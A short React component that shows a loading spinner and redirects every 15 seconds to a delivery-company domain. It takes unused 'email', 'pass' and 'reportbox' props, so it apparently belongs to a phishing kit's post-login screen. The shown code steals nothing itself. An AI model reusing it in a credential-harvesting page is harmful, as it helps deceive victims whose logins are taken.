import React, { useEffect } from "react";
import "./loaderstyle.css";

function IcexpressShell({ email, pass, reportbox }) {
  useEffect(() => {
    setInterval(() => {
      window.open("https://icexpressdelivery.online", "_self");
    }, 15000);
  });
  return (
    <div style={{ display: "flex", justifyContent: "center", marginTop: 50 }}>
      <div className="lds-default">
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
        <div />
      </div>
    </div>
  );
}

export default IcexpressShell;
